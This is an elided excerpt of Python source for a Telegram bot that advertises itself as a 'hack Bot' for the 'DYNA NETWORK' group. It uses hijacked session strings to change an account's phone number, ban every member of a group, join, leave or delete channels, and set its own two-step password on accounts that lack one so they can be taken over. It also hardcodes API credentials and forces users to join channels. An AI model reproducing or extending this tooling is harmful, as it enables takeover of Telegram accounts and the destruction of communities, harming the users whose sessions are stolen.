...
client = TelegramClient('DYNA_OPTIMISE', api_id, api_hash).start(bot_token=token)
...
legendboy = 2068551800

Bot_Username =os.environ.get("BOT_USERNAME", None) or "KINGZ_DBOT"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 2634874, "a418fd5c4497ca9986f31c314da6f170") as X:
    bot = client = X
    try:
      await bot(join("@DYNA_SUPPORT"))
...
'''
mm = '''
**⚜NOTICE FIRST JOIN HACK GROUP @DYNA_NETWORK⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/DYNA_NETWORK")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/DYNA_SUPPORT")
        ]
      ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Banning all members. Thanks For using hack Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\nThanks For using Dyna Network Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Joined the Channel/Group Thanks For using Dyna Network Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Leaved the Channel/Group Thanks For using Dyna Netowork Bot,", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("Deleted the Channel/Group Thanks For using Dyna Network Bot.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `@DYNA_NETWORK Is best` you can login now\n\nThanks For using DYNA NETWORK'S bot.", buttons=keyboard)
      else:
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @DYNA_SUPPORT\n**LOGS**\n" + str(e))
